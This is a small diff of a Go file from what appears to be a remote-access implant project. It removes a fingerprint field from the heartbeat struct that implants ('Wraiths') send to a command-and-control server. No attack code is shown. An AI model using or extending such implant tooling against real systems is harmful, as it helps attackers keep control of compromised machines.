@@ -5,9 +5,6 @@ import "time"
 // The structure of heartbeats which Wraiths send to c2 to register
 // their status and presence.
 type PacketHeartbeat struct {
-	// The unique fingerprint of this Wraith.
-	Fingerprint string
-
 	// A unique fingerprint of the family/strain this Wraith belongs to.
 	StrainId string
 
